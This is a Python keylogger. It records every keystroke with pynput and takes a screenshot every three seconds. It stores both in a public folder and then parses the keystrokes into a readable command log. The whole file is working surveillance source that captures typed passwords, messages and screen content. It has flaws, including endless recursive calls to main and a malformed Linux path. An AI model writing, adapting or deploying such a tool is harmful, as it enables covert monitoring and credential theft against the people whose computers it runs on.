# Import built-in modules #
import logging
import pathlib
import re
import time
import os
from multiprocessing import Process

# Import third-party modules #
from PIL import ImageGrab
from pynput.keyboard import Key, Listener

'''
################
Function Index #
########################################################################################################################
OnPress - For key listener, write sentence to file if enter is pressed, kill screenshot capturing process if escape \
          is pressed, otherwise append the entered key to the key capture list to form sentence.
Screenshots - Loop that actively takes screenshots.         
RegexFormatting - Parses the logged pynput keys into into human readable format.
main - Facilitates key listener thread and screenshot capture.
########################################################################################################################
'''

# Pseudo constants #
WAIT_TIME = 3

# Global variables #
global key_file, screenshot
last_pic = 0


'''
########################################################################################################################
Name:       OnPress
Purpose:    For key listener, write sentence to file if enter is pressed, kill screenshot capturing process if escape \
            is pressed, otherwise append the entered key to the key capture list to form sentence.
Parameters: The key that the key listener detected the user pressed.
Returns:    Nothing on enter key, boolean false on escape key, otherwise the keys capture list with new member.
########################################################################################################################
'''
def OnPress(key):
    global key_file, keys, screenshot

    # If the enter key was pressed #
    if key == Key.enter:
        # Write the sentence logged in keys capture list to file #
        key_file.write(str(keys) + '\n\n')
        del keys[:]
    # If the escape key was pressed #
    elif key == Key.esc:
        # Kill the screenshot capturing process #
        screenshot.terminate()
        return False
    # If the key is intended to be recorded #
    else:
        keys.append(key)
        return keys


'''
########################################################################################################################
Name:       Screenshots
Purpose:    Loop that actively takes screenshots.
Parameters: Path to local storage for files.
Returns: None
########################################################################################################################
'''
def Screenshots(path: str):
    global last_pic

    while True:
        # Take a screenshot #
        pic = ImageGrab.grab()

        while True:
            # Format screenshot to number of last capture #
            pic_path = f'{path}Screenshot{last_pic}.png'

            # If file name is unique #
            if not os.path.isfile(pic_path):
                # Save the picture as png #
                pic.save(pic_path)
                # Increment static count #
                last_pic += 1
                break

            # Increment static count #
            last_pic += 1

        # Sleep execution by time interval #
        time.sleep(WAIT_TIME)


'''
########################################################################################################################
Name:       RegexFormatting
Purpose:    Parses the logged pynput keys into into human readable format.
Parameters: Path to local storage for files.
Returns:    None
########################################################################################################################
'''
def RegexFormatting(path):
    # Compile parsing patterns #
    regex = re.compile(r'(?:(^\[)|([\',])|(]$))')
    regex2 = re.compile(r'''<Key\.
                            (?:ctrl|shift|alt|caps_lock|
                            tab|cmd|home|insert|delete|
                            end|page|left|down|right|up|
                            print_screen
                            )
                            ((?:_l|_r|_up|_down
                            )?)
                            :.<[0-9]+>>''', re.X)

    regex3 = re.compile(r'[^\S\r\n]')
    regex4 = re.compile(r'.<Key\.backspace:<8>>')
    regex5 = re.compile(r'<Key\.space:>')

    # Open un-formatted file #
    with open(f'{path}keys.txt') as parse_file:
        # Iterate line by line #
        for line in parse_file:
            # Perform a series of parsing substitutions #
            sub = re.sub(regex, r'', str(line))
            sub2 = re.sub(regex2, r'', str(sub))
            sub3 = re.sub(regex3, r'', str(sub2))
            sub4 = re.sub(regex4, r'', str(sub3))
            result = re.sub(regex5, r' ', str(sub4))

            # Open the result command log file #
            with open(f'{path}commands.txt', 'a') as final_log:
                # Write parsed result to file #
                final_log.write(result)


'''
########################################################################################################################
Name:       main
Purpose:    Facilitates key listener thread and screenshot capture.
Parameters: None
Returns:    None
########################################################################################################################
'''
def main():
    global key_file, screenshot

    input('Please hit enter to begin\n')

    # Open the file to record keystrokes #
    with open(f'{file_path}keys.txt', 'a') as key_file:
        # Create the key listener and screenshot taker #
        key_listener = Listener(on_press=OnPress)
        screenshot = Process(target=Screenshots, args=(file_path,))

        # Start the processes #
        key_listener.start()
        screenshot.start()

        # Join the processes #
        key_listener.join(600.0)
        screenshot.join(timeout=600)

    # Call the function to parse key logs to readable format #
    RegexFormatting(file_path)

    main()


if __name__ == '__main__':
    # List to temporarily store captured keys #
    keys = []

    # If OS is Windows #
    if os.name == 'nt':
        # Create storage directory #
        pathlib.Path('C:/Users/Public/Tutorial').mkdir(parents=True, exist_ok=True)
        file_path = 'C:\\Users\\Public\\Tutorial\\'
    # Linux #
    else:
        # Create storage directory #
        pathlib.Path('/tmp/Tutorial').mkdir(parents=True, exist_ok=True)
        file_path = '\\tmp\\Tutorial\\'

    try:
        main()

    except KeyboardInterrupt:
        print('* Ctrl-C detected ... exiting program *')
    except Exception as ex:
        logging.exception('* Error Occurred: {} *'.format(ex))
